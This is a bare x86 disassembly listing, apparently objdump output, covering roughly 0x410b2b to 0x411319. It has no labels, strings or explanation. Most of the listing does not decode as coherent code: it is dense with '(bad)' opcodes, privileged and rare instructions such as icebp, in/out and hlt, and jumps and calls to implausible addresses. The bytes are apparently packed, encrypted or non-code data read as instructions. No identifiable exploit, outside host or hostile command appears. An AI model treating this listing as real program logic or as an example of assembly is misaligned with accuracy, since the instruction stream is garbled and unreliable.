  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
